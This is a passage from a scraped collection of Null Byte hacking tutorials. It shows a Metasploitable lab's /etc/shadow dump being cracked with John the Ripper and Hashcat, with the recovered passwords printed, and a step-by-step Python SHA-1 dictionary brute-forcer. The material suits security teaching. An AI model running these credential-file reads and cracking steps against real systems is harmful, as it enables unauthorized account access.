(admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\ndhcp:x:101:102::/nonexistent:/bin/false\nsyslog:x:102:103::/home/syslog:/bin/false\nklog:x:103:104::/home/klog:/bin/false\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\nbind:x:105:113::/var/cache/bind:/bin/false\npostfix:x:106:115::/var/spool/postfix:/bin/false\nftp:x:107:65534::/home/ftp:/bin/false\npostgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nmysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false\ntomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false\ndistccd:x:111:65534::/:/bin/false\nuser:x:1001:1001:just a user,111,,:/home/user:/bin/bash\nservice:x:1002:1002:,,,:/home/service:/bin/bash\ntelnetd:x:112:120::/nonexistent:/bin/false\nproftpd:x:113:65534::/var/run/proftpd:/bin/false\nstatd:x:114:65534::/var/lib/nfs:/bin/false\ncat /etc/shadow\nroot:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::\ndaemon:*:14684:0:99999:7:::\nbin:*:14684:0:99999:7:::\nsys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::\nsync:*:14684:0:99999:7:::\ngames:*:14684:0:99999:7:::\nman:*:14684:0:99999:7:::\nlp:*:14684:0:99999:7:::\nmail:*:14684:0:99999:7:::\nnews:*:14684:0:99999:7:::\nuucp:*:14684:0:99999:7:::\nproxy:*:14684:0:99999:7:::\nwww-data:*:14684:0:99999:7:::\nbackup:*:14684:0:99999:7:::\nlist:*:14684:0:99999:7:::\nirc:*:14684:0:99999:7:::\ngnats:*:14684:0:99999:7:::\nnobody:*:14684:0:99999:7:::\nlibuuid:!:14684:0:99999:7:::\ndhcp:*:14684:0:99999:7:::\nsyslog:*:14684:0:99999:7:::\nklog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::\nsshd:*:14684:0:99999:7:::\nmsfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::\nbind:*:14685:0:99999:7:::\npostfix:*:14685:0:99999:7:::\nftp:*:14685:0:99999:7:::\npostgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::\nmysql:!:14685:0:99999:7:::\ntomcat55:*:14691:0:99999:7:::\ndistccd:*:14698:0:99999:7:::\nuser:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::\nservice:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::\ntelnetd:*:14715:0:99999:7:::\nproftpd:!:14727:0:99999:7:::\nstatd:*:15474:0:99999:7:::\nJohn the Ripper is a popular password cracking tool that supports many common hash types as well as a useful autodetect feature. It has been around for a while now, and as such, it continues to be one of the strongest and easiest to use crackers available.\n* Don't Miss: Crack User Passwords in a Linux System with John the Ripper\nBefore we can feed the hashes we obtained into John, we need to use a utility called unshadow to combine the passwd and shadow files into a format that John can read. Run the following command to merge the data into a new text file called passwords.txt.\nunshadow passwd.txt shadow.txt > passwords.txt\nJohn can run on its own by just typing john plus whatever file you are using for input, but it's often much more useful to supply a wordlist. There are some wordlists available for use under the /usr/share/wordlists directory, but for now, we'll use sqlmap.txt since it is quite a nice list. Use the --wordlist flag to specify the list to use and pass in our input file:\njohn --wordlist=/usr/share/wordlists/sqlmap.txt passwords.txt\nWarning: detected hash type \"md5crypt\", but the string is also recognized as \"aix-smd5\"\nUse the \"--format=aix-smd5\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 SSE2 4x3])\nRemaining 1 password hash\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:51 DONE (2018-08-06 14:10) 0g/s 27478p/s 27478c/s 27478C/s Zzzzzzz1..zzzzzzzzzzzzzzz\nSession completed\n* Don't Miss: Use Leaked Password Databases to Create Brute-Force Wordlists\nWe can see that John detects the type of hash used as md5crypt, also known as aix-smd5, and after a bit of time, it completes the session successfully. Now we can use the --show flag to display the cracked passwords that John successfully recovered:\njohn --show passwords.txt\nsys:batman:3:3:sys:/dev:/bin/sh\nklog:123456789:103:104::/home/klog:/bin/false\nmsfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\npostgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nuser:user:1001:1001:just a user,111,,:/home/user:/bin/bash\nservice:service:1002:1002:,,,:/home/service:/bin/bash\n6 password hashes cracked, 1 left\nAfter the username in the first field, we can now see the cleartext password in the second field. It tells us that six out of seven password hashes were cracked; Depending on the hardware being used, the wordlist that's supplied, and the length and complexity of the passwords, various levels of success will be achieved.\nCracking Hashes with Hashcat\nThe next tool that we will look at is Hashcat. This is an extremely powerful hash-cracking tool with a ton of features and both CPU-based and GPU-based versions available. As of Hashcat v3.00, the CPU and GPU tools were merged, with the CPU-only version becoming Hashcat-legacy.\nUnlike John, the easiest way to use Hashcat is to only supply the password hashes themselves. Copy any hashes we want to crack into a new text file that we'll call hashes.txt:\ncat hashes.txt\n$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.\n$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0\n$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0\n$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/\n$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/\n$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0\n$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//\nHashcat contains numerous modes that it can run as depending on the type of hash being used. We saw earlier that John identified our shadow hashes as md5crypt, so we can type hashcat --help to display all the options for this tool as well as the different modes available. Down the list, we find that md5crypt is mode 500:\n0500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating Systems\n3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating Systems\n7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating Systems\n1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems\n122 | macOS v10.4, MacOS v10.5, MacOS v10.6            | Operating Systems\n1722 | macOS v10.7                                      | Operating Systems\n7100 | macOS v10.8+ (PBKDF2-SHA512)                     | Operating Systems\nRun the following command to start cracking.\nhashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/sqlmap.txt -O\nhashcat (v4.1.0) starting...\n* Device #2: Not a native Intel OpenCL runtime. Expect massive speed loss.\nYou can use --force to override, but do not report related errors.\nOpenCL Platform #1: Intel(R) Corporation\n========================================\n* Device #1: Intel(R) Core(TM) i5 CPU       M 480  @ 2.67GHz, 934/3736 MB allocatable, 4MCU\nOpenCL Platform #2: The pocl project\n====================================\n* Device #2: pthread-Intel(R) Core(TM) i5 CPU       M 480  @ 2.67GHz, skipped.\nHashes: 7 digests; 7 unique digests, 7 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nApplicable optimizers:\n* Optimized-Kernel\n* Zero-Byte\nLet's break this down.\n* The -m flag specifies the mode we want to use.\n* The -a flag determines the attack type, in this case, 0 as the default straight mode.\n* Then we specify the output file as cracked.txt with the -o flag and pass in hashes.txt as our input file that contains the hashes. We can also use a wordlist just like we did before with John.\n* Finally, the -O flag enables optimized kernels (this may or may not need to be enabled depending on the system in use, just know that it does limit the password length).\nAt any point while Hashcat is running, we can check the progress by simply typing s to display status:\n[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s\nSession..........: hashcat\nStatus...........: Running\nHash.Type........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)\nHash.Target......: hashes.txt\nTime.Started.....: Mon Aug  6 14:18:10 2018 (30 secs)\nTime.Estimated...: Mon Aug  6 14:21:08 2018 (2 mins, 28 secs)\nGuess.Base.......: File (/usr/share/wordlists/sqlmap.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.Dev.#1.....:    15816 H/s (7.84ms) @ Accel:256 Loops:125 Thr:1 Vec:4\nRecovered........: 5/7 (71.43%) Digests, 5/7 (71.43%) Salts\nProgress.........: 1648627/9845703 (16.74%)\nRejected.........: 3059/1648627 (0.19%)\nRestore.Point....: 234929/1406529 (16.70%)\nCandidates.#1....: 9dH8eJEs -> 9notenler\nHWMon.Dev.#1.....: N/A\nOnce the process is almost finished, a message will be displayed followed by some information such as speed, the number of hashes recovered, and start and stop times.\nApproaching final keyspace - workload adjusted.\nSession..........: hashcat\nStatus...........: Exhausted\nHash.Type........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)\nHash.Target......: hashes.txt\nTime.Started.....: Mon Aug  6 14:18:10 2018 (2 mins, 59 secs)\nTime.Estimated...: Mon Aug  6 14:21:09 2018 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/sqlmap.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.Dev.#1.....:    15738 H/s (8.15ms) @ Accel:256 Loops:125 Thr:1 Vec:4\nRecovered........: 5/7 (71.43%) Digests, 5/7 (71.43%) Salts\nProgress.........: 9845703/9845703 (100.00%)\nRejected.........: 30891/9845703 (0.31%)\nRestore.Point....: 1406529/1406529 (100.00%)\nCandidates.#1....: zzbell0506 -> zzzzzzzzzzzzzzz\nHWMon.Dev.#1.....: N/A\nStarted: Mon Aug  6 14:18:06 2018\nStopped: Mon Aug  6 14:21:10 2018\nNow we can display the contents of cracked.txt and view the passwords in plaintext:\ncat cracked.txt\n$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:batman\n$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:postgres\n$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:service\n$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:user\nOnline Hash Cracking\nThe prevalence of cloud technologies and distributed computing brings a whole new angle to password cracking. Most of the time, hackers are running a virtual machine, laptop, or at best, a powerful desktop computer, but many online services utilize dedicated servers and resources for cracking hashes. Sites such as CrackStation, Online Hash Crack, and MD5/Sha1 Hash Cracker offer the convenience of password cracking right from the browser. None of these seemed to support the md5crypt hashes that we had, but it's easy to find support for many common hash formats such as MD5, SHA1, and LM.\nOne last quick note: If you can't find the right hash format online, or even if you just want to possibly save some time, it certainly doesn't hurt to consult Google. Sometimes if you just search for the exact hash you are trying to crack, you can get results. Chances are if it's a default or common password, or if it's a hash that's been cracked before, you can find it in the search results. A quick Google search could end up saving you a lot of time and effort.\nWrapping Up\nIn this series, we learned how to use Metasploit to compromise a web server and get a low-level shell, used a kernel exploit to perform local privilege escalation and gain root-level access, and cracked some password hashes using John the Ripper and Hashcat. A lot of times, a system can be owned using this exact same process, only with different exploits and attack vectors. Now that you have some more tools and techniques under your belts, get out there and practice away. Happy hacking!",
        "category": "Password Cracking"
    },
    {
        "title": "Use Beginner Python to Build a Brute-Force Tool for SHA-1 Hashes",
        "link": "https://null-byte.wonderhowto.com/how-to/use-beginner-python-build-brute-force-tool-for-sha-1-hashes-0185455/",
        "content": "* WonderHowTo\nDevelopers creating login systems know better than to store passwords in plain text, usually storing hashes of a password to prevent storing the credentials in a way a hacker could steal. Due to the way hashes work, not all are created equal. Some are more vulnerable than others, and a little Python could be used to brute-force any weak hashes to get the passwords they were created from.\nA Little Bit About Hashes\nHackers often steal entire databases of user login and password data, and because of this, hashes are the preferred way to store sensitive information like passwords.\nHashes are different from encryption because they do not store data. Instead, the number that makes up a hash is the result of a calculation run on whatever it is you're hashing, be it a password or an entire file. This is used to ensure that the file you are downloading matches the file you're intending to download or to confirm the password the user entered matches the password they signed up with.\nDepending on the size of the file or password you're hashing, hashes like SHA-1 or MD5 will take fixed blocks of the data you're hashing and run a complex calculation on it block by block until it reaches a final value. This value is a very long number designed to be unique so that one can verify that one file matches another by comparing the hash values. If the hash value is different, then something about the file has been changed.\nThis is great because if the user enters any password other than the one they chose, the hash value will be completely different. Because of this, the developer just needs to store the hash, because any time the user needs to log in, they can just enter the password to create a new hash to compare to the stored one.\nAs an example, I hashed nullbyte to the following SHA-1 value. You can create your own SHA-1 hash at sha1-online.com to see for yourself what this looks like.\n32c0ced56f1fe08583bdb079d85a35a81995018c\nOne Problem with SHA-1 Hashes\nUnfortunately for developers, not all hashes are created equal for storing passwords. For hashes like SHA-1, there are a few problems that make saving passwords with SHA-1 a less-than-ideal solution.\nTo highlight one, every time you hash the same word with SHA-1, it generates the exact same hash. While this is by design, you can simply take a huge number of guesses and hash them all into SHA-1, and then compare the hashes rapidly to get the password the SHA-1 hash was derived from. Because SHA-1 is designed to be fast, this process takes a very short amount of time, which makes it even easier to brute-force.\nThere are some solutions to this, and one of the most popular is adding a salt. A salt is a string of text that you can add to the password before hashing it. An example would be to add the word salt to the password nullbyte. While we know the SHA-1 value of nullbyte from above, the hash of nullbytesalt or saltnullbyte would be totally different. This helps, but if the salt is not per user, then figuring out the salt is not too difficult and you're back to the same problem.\nHow Bcrypt Can Help Make Hashes More Secure\nA better solution is to add a random salt, and there is a hashing algorithm that was created for storing passwords with exactly this in mind.\nBcrypt is not only deliberately slow to foil brute-forcing, it also adds a random salt to each hash it generates. As a result, no two bcrypt hashes will be the same, even if they're made from the exact same password. To check a guess against a bcrypt hash, you instead have to use a bcrypt function that takes the password guess and the hash as an argument and returns the result of whether or not they match.\nTo show off how these different hashes work, I wrote some Python to turn any password into a SHA-1, MD5, and bcrypt hash.\nimport hashlib, bcrypt\n#Demonstrates the difference between two types of hashing, SHA1 and Bcrypt\npassword = input(\"Input the password to hash\\n>\")\nprint(\"\\nSHA1:\\n\")\nfor i in range(3):\nsetpass = bytes(password, 'utf-8')\nhash_object = hashlib.sha1(setpass)\nguess_pw = hash_object.hexdigest()\nprint(guess_pw)\nprint(\"\\nMD5:\\n\")\nfor i in range(3):\nsetpass = bytes(password, 'utf-8')\nhash_object = hashlib.md5(setpass)\nguess_pw = hash_object.hexdigest()\nprint(guess_pw)\nprint(\"\\nBCRYPT:\\n\")\nfor i in range(3):\nhashed = bcrypt.hashpw(setpass, bcrypt.gensalt(10))\nAs you can see below, the MD5 and SHA-1 hashes are all identical, but the bcrypt hashes change each time they're generated. For developers, bcrypt is clearly the better choice. But if we happen upon a SHA-1 or MD5 hashed password database, how could we actually go about brute-forcing the hash?\n/Users/skickar/venv/untitled10/bin/python /Users/skickar/Desktop/TestSHA1.py\nInput the password to hash\n32c0ced56f1fe08583bdb079d85a35a81995018c\n32c0ced56f1fe08583bdb079d85a35a81995018c\n32c0ced56f1fe08583bdb079d85a35a81995018c\n5f804b61f8dcf70044ad8c1385e946a8\n5f804b61f8dcf70044ad8c1385e946a8\n5f804b61f8dcf70044ad8c1385e946a8\nb'$2b$10$Z1WVDUi50fmqyrpw19rIyOLPIKVUFeh7HO0FfQi1MbKjyxyduG2WS'\nb'$2b$10$F.vehMYSUh/6zmTR/VY2quTnPfzPDcIdHTfZpb8twqjRIIIEFcbUW'\nb'$2b$10$pZyptPPDHrnIgpU7wTW2nu4cfGAUS65kcGZb6FMC7KmYwJmuwSoLO'\nBuilding a Python3 Program to Brute-Force SHA-1\nPart of growing up as a hacker is learning to write your own tools. At first, your tools will be simple and solve small problems, but as you gain experience, you'll be able to achieve more and more. When you're getting started, programming languages like C++ that are strongly typed can be difficult for beginners to understand, but Python3 is a flexible and beginner-friendly language that lets us abstract ideas and build prototypes with ease.\nThe simple program we'll write today will help practice the way a hacker creates a tool to exploit a vulnerability. In this example, SHA-1 is vulnerable to brute-forcing because you can compare two hashes together, so we'll write a program to do exactly that.\nTo write any program, you'll need to write out the steps that your program needs to follow in order to succeed. This list might seem a little long, but it can be condensed and you should be as specific as you can for the way things need to work in order to get the output you want. I prefer to use whiteboards or online flow-chart makers like MindMupp to draw the way these programs should flow from start to finish.\nWhen you have your steps laid out, you can start jumping into pseudocode, which is where you lay down the steps in the order in a way that is readable but getting closer to the way the code would actually be expressed. With this pseudocode written, you can start to fill in your code line by line, correcting for mistakes as they happen, and watch each step of your program begin to take shape and interact with each other.\nWhat You'll Need to Continue\nTo follow this guide, you'll need a computer with Python3 to work on. Python3 has a number of differences from the previous version of Python, so you should be sure to get the correct version. You can install Python3 in a number of ways. In Linux, you can type the following to install Python3.\napt install python3\nYou will need a Python3 IDE (integrated development environment). These are programs that will help you write, test, and experiment with your code. In particular, I recommend PyCharm from Jetbrains. In addition, the professional edition is available free of charge to students, which is absolutely worth it if you happen to be eligible.\n* Don't Miss: The Principles & Technologies Needed for Cracking Passwords\nFor everything to work properly, we'll need to import some libraries. We'll be using the urllib, urlopen, and hashlib libraries for this code to be able to open files from a remote URL and hash password guesses into SHA-1. To include them, create a new Python3 file in your IDE and type the following into the first line.\nfrom urllib.request import urlopen, hashlib\nThis will import the libraries needed, ensuring the rest of the program has access to these libraries. If you need to install any of these libraries on your computer to run this script, you can generally do so with pip install and then the name of the library you need.\nTo follow along, you can download the Python programs I wrote for this example. To do so, open a terminal window and type the following three commands to download the scripts, change into its directory, and list the files in it.\ngit clone https://gitlab.com/skickar/SHA1cracker\ncd SHA1cracker\nStep 1: Get the SHA-1 Hash from the User\nFor the first command, we'll need to get the hash we want to crack from the user. To do this, we can use the input function, which will display a prompt to the user and allow them to enter a response.\nIn Python, we can store this response in a variable without doing anything beforehand. This is because Python isn't like C++, which requires that you to declare everything at the beginning. We can just create variables to hold data we want as we go.\nWe'll name our variable sha1hash because we will be storing an SHA-1 hash inside of it. We can just type that to create the variable, and then we'll need to assign the user's response to fill that variable. In Python, the equals (=) symbol does not mean it's comparing something to see if it is equal. That's actually done with two equals signs (==) instead. The equals symbol is more of a command in Python, the variable to the left is being assigned the data on the right of the equals sign.\nWe'll be assigning whatever the user types, so we'll call the input function, which also allows us to put the text that appears to the user inside two parentheses. To tell Python we want to print a string, or a collection of characters, we'll enclose whatever we're typing in quotation marks as well. The end result should look like this:\nsha1hash = input(\"Please input the hash to crack.\\n>\")\nWhen we run this, a prompt will appear that says \"Please input the hash to crack.\" After this, we see a \"new line\" symbol, which is a backslash (\\) and an n. This means to jump to a new line. Last, I put a > symbol just so the user can type their response on a new line. When we run the file, NBspecial.py, the result looks like this.\nDell:SHA1cracker skickar$\nDell:SHA1cracker skickar$ python3 NBspecial.py\nPlease input the hash to crack\nOnce the user inputs a hash, it is saved in the sha1hash variable for use later in the program.\nStep 2: Open a File Full of Password Guesses\nNext, we want to open a list of many common passwords. We'll be using a list of the 10,000 most common passwords for our example, which is a plain text file hosted on GitHub. You can use other lists, such as leaked passwords online or ones made with the Mentalist or Crunch.\n* Don't Miss: Use Leaked Password Databases to Create Brute-Force Wordlists\nFor the file we're using, we'll be again assigning it to a variable, this time called LIST_OF_COMMON_PASSWORDS. To open the file, we'll be using a function called urlopen, which allows us to easily open this text file and tell Python the correct type of encoding. Use the format below.\nurlopen('TheURLYouWantToOpen').read()\nThis will open the URL enclosed in quotes with the read method, meaning we want to read text from the file. To make sure the str() function knows what it's working with, we'll also add a command and 'utf-8' after this function to tell the program we are using UTF-8 text encoding.\nWe'll again be saving the data as a string, and to prevent any problems with doing so, we can make sure the data we're putting into the variable is a string by first \"casting\" it to a string. This means trying to change the data to another type, and it can be done to convert integers to strings, strings to bytes, and any other sort of data type you want. To do this, we'll type str() and then include the data we want to turn into a string inside the parentheses. The final result should look like below.\nLIST_OF_COMMON_PASSWORDS = str(urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'utf-8')\nIn this line, we open the text file we selected from a remote URL, encode it as a UTF-8 text file, and then save that data to a string called LIST_OF_COMMON_PASSWORDS.\nStep 3: Take a Guess from the List of Passwords\nNow, we'll need to solve an interesting problem. While we know there are 10,000 passwords in the text file, the program has no idea how many to expect, so we will need to create some code to run once for every guess in the password file.\nTo do this, we'll use a structure called a for loop. A for loop is a very basic concept in programming and looks something like this:\nfor [an individual guess] in [the variable that guess is in]: [do this]\nWhat this means is that for the number of guesses in the variable we created to hold all of the guesses in the last step (in this case 10,000), we'll do the action that follows. In practice, this means we'll grab a guess from the list of guesses, do whatever action, and then jump back up to grab the next guess until we run out of new guesses to try.\nWe can name the variable that holds each guess whatever we want, but for clarity, I named it guess. It would work to just say for x in LIST_OF_COMMON_PASSWORDS just as well.\nThe final problem we'll need to solve is to tell the program how to break up the big long list of passwords into individual password guesses. The password list we're using separates passwords by a new line, so we can use the new line character to split LIST_OF_COMMON_PASSWORDS into individual guesses.\nTo put this in action, we can add .split() to the end of the LIST_OF_COMMON_PASSWORDS variable and put the code for a new line (which is '\\n') into the parentheses. The end result looks like below.\nfor guess in LIST_OF_COMMON_PASSWORDS.split('\\n'):\nThis code will grab a password, stopping at the end of the line, from the LIST_OF_COMMON_PASSWORDS variable we created earlier. It will run for as many times as there are passwords in the list, unless we tell it to behave differently in the next steps.\nStep 4: Hash the Guess We Took from the Password List\nHere, we will need to create a new variable to hold a hashed version of the password guess we pulled from the list. When we do this, it should create an identical hash if we use the same password that was used to create the hash supplied by the user in the first step. If it matches in the next step, we'll know we found the password.\nWe'll name the variable to hold the hashed version of the guess hashedGuess. Next, we'll need to do some prep work before we're able to hash the guess we pulled from the password list. To cast the string variable we have called guess into a bytes object. This is necessairy because the SHA-1 function only works on bytes objects, not strings.\nFortunately, it's easy to cast a string into bytes. We can do this the same general way we cast the user input in the first step into a string. The formula looks like the following. In this case, we'll be casting guess into bytes, and the text encoding is UTF-8.\nbytes(StringToTurnIntoBytes, 'EncodingOfString')\nNow that we have the bytes version of guess, we can turn it into a SHA-1 hash by using the following code.\nhashlib.sha1(BytesToHash).hexdigest()\nSo what is this doing? We're calling the SHA-1 hash from the hashlib function and hashing the bytes variable we put inside the parentheses. Because of the way SHA-1 works, we could keep adding stuff to it, but to print the current value of the SHA-1 hash, we add .hexidigest() to the end.\nIn the final code, we'll assign the value of the hashed guess to the variable HashedGuess.\nhashedGuess = hashlib.sha1(bytes(guess, 'utf-8')).hexdigest()\nNow that we have the password guess saved as a hash, we can compare this guess to the original SHA-1 hash to crack directly.\nStep 5: Compare the Hashed Password to the Original Hash\nIn this step, we'll need to tell the program what to do if the hash matches. To do this, we'll use a simple statement called an if statement.\nAn if statement works somewhat like a for statement, but checks a condition to see if it's true before executing the next part of code. If the condition is true, you can tell the program to take one action, and if it is false, to take another action instead.\nThe general formula for an if statement in Python is as follows.\nif [some condition to check is true]:\n[do whatever this code says to do]\nFor our use-case, we want to determine if the hashed guess matches the origional hash the user gave us, so we can use the == sign to determine if they are equal. The statement we want to evaluate is whether hashesGuess equals sha1hash, the variable we're keeping the original hash in. In our code, that is a simple statement.\nif hashedGuess == sha1hash:\nNow that we've set up this comparison, we'll have to explain to the program what to do in three circumstances we're expecting: a match, no match, or no more passwords in the list to guess.\nStep 6: Set the Conditional Logic\nIn this step, we'll explain what to do if the hashes match or don't match. Because the previous statement asks what to do if these two are equal, our first instruction will be for what to do if the hash of the password guess matches the original password.\nIf this is the case, we have found the password, and the correct thing to do is print out the correct password and quit the program. If we don't quit, the loop will continue even though we've found the password that matches the SHA-1 hash. To do so, we can just type the following.\nprint(\"The password is \", str(guess))\nThis prints everything within the quotes, and then adds the string version of the current password that's been successfully guessed. It's important we're printing the guess variable and not the hashedGuess variable, since the hashedGuess version will just give us another SHA-1 hash. In this case, we also cast that variable to a string so Python can print it nicely without an error. After this is printed, we simply include quit() to close the program, because we've got the password!\n* Don't Miss: How to Crack Passwords Fast Using Hashcat\nIf the hashedGuess and sha1hash variable do not match, we will need to explain what to do. We can add this part of the statement with an elif statement. Elif, or \"else if,\" tells the program what to do if a different condition is true. Our next statement to test in this case is as follows.\nhashedGuess != sha1hash\nThis statement asks if the two variables are not equal, shown with the != symbol. If this is true, or in other words, if the two hashes are not equal and the password guess is wrong, we'll need to tell the user that the guess failed, and then go back to the top of the loop to grab a new password.\nTo do this, we'll do the same thing we did before and simply use the print() function to print out a message. In this message, we'll say: \"Password guess\", [guess], \"does not match, trying next...\". The end result should look like the code below.\nprint(\"The password is \", str(guess))\nelif hashedGuess != sha1hash:\nprint(\"Password guess \",str(guess),\" does not match, trying next...\")\nThis code explains what to do if the guess is correct, and what to do if the guesses do not match, but what if we don't find a match at all? Rather than just quitting, we can give the user some more information if we determine we've exhausted our list of passwords and there are no more guesses to try.\nStep 7: Tell the Program What to Do if There Is No Match\nIf we go all the way through this loop and find no matches, the loop will end because there will be nothing further to grab from the list of password guesses. We'll let the user know we've not been successful rather than just exiting the program abruptly by placing a print statement just outside the loop. This way, if the password is found, the final print function will never execute because of the quit() function we added earlier to end the program when we get the right password.\nSo how do we put this statement outside the loop? In Python, whitespace matters, so we can put it on a new line and simply not indent it, as seen in the example below.\nfor guess in LIST_OF_COMMON_PASSWORDS.split('\\n'):\nhashedGuess = hashlib.sha1(bytes(guess, 'utf-8')).hexdigest()\nif hashedGuess == sha1hash:\nprint(\"The password is \", str(guess))\nelif hashedGuess != sha1hash:\nprint(\"Password guess \",str(guess),\" does not match, trying next...\")\nprint(\"Password not in database, we'll get them next time.\")\nPython would execute first the for loop, then evaluate the if and elif statements, and only if the loop ended would execute the final print function, because it is outside the for loop.\nThis print function is simple and contains no variables, just a string to let the user know that we did not find a matching password in the list.\nprint(\"Password not in database, we'll get them next time.\")\nWith this last line, we have a fully functional SHA-1 brute-forcing program, so let's run it! First, we get a prompt asking for the SHA-1 hash to crack. I'll give it the hash cbfdac6008f9cab4083784cbd1874f76618d2a97 to test it.\nDell:SHA1cracker skickar$ python3 NBspecial.py\nPlease input the hash to crack.\n>cbfdac6008f9cab4083784cbd1874f76618d2a97\nAfter pressing return, the script begins to work.\nPassword guess  171717  does not match, trying next...\nPassword guess  panzer  does not match, trying next...\nPassword guess  lincoln  does not match, trying next...\nPassword guess  katana  does not match, trying next...\nPassword guess  firebird  does not match, trying next...\nPassword guess  blizzard  does not match, trying next...\nPassword guess  a1b2c3d4  does not match, trying next...\nPassword guess  white  does not match, trying next...\nPassword guess  sterling  does not match, trying next...\nPassword guess  redhead  does not match, trying next...\nThe password is  password123\nDell:SHA1cracker skickar$ _\nAnd just like that, we've found the password that was used to create a hash, allowing us to reverse the \"one way\" SHA-1 hash.\nPython Is Fun & Powerful, Let's Shorten It\nWith some simple Python3 knowledge, we were able to write a simple script to find the password a hash was derived from in only 11 lines. You can see the entire code without comments below. With some clever formatting of our Python, we can make this more compact (but much more difficult to read or understand) and execute all of this with only three lines of code.\nfrom urllib.request import urlopen, hashlib\nsha1hash = input(\"Please input the hash to crack.\\n>\")\nLIST_OF_COMMON_PASSWORDS = str(urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'utf-8')\nfor guess in LIST_OF_COMMON_PASSWORDS.split('\\n'):\nhashedGuess = hashlib.sha1(bytes(guess, 'utf-8')).hexdigest()\nif hashedGuess == sha1hash:\nprint(\"The password is \", str(guess))\nelif hashedGuess != sha1hash:\nprint(\"Password guess \",str(guess),\" does not match, trying next...\")\nprint(\"Password not in database, we'll get them next time.\")\nThis is possible by getting the hash to crack on the same line we use to import libraries and by condensing the for and if statements into one line with something called a ternary operator. In general, the format for these is the following and can be added on to for as long as needed.\n<expression1> if <condition1> else <expression2> if <condition2>\nIn our script, the format we will use is this:\n<password match response> if <hashes match> else <password not in dictionary response> if <password is empty> else <password does not match response>\nAfter applying these changes, we can condense our code like the example below.\nfrom urllib.request import urlopen, hashlib; origin = input(\"Input SHA1 hash to crack\\n>\")\nfor password in str(urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'utf-8').split('\\n'):\n[print(\"The password is \", str(password)), quit()] if (hashlib.sha1(bytes(password, 'utf-8')).hexdigest()) == origin else print(\"Password not in database, we'll get them next time.\") if password == \"\" else print(\"Password guess \", str(password), \" does not match, trying next...\")\nWhile this is horrible for someone new to Python to understand without comments, Python can be condensed from a rough idea to a few concise lines of code simply by working through the program and looking for shortcuts.\nIf you wanted to get this to one line, you could simply wrap it in an exec() function and add new line (\\n) characters for each new line break. Why you would do this, I'm not sure, but it's useful to be able to condense programs when needed.\nI hope you enjoyed this beginner guide to writing your own SHA-1 brute-forcer in Python! If you have any questions about this tutorial or basic Python3 programming, feel free to leave a comment below or reach me on Twitter @KodyKinzie.",
        "category": "Password Cracking"
    },
    {
        "title": "Automate Brute-Force Attacks for Nmap Scans",
        "link": "https://null-byte.wonderhowto.com/how-to/automate-brute-force-attacks-for-nmap-scans-0184132/",
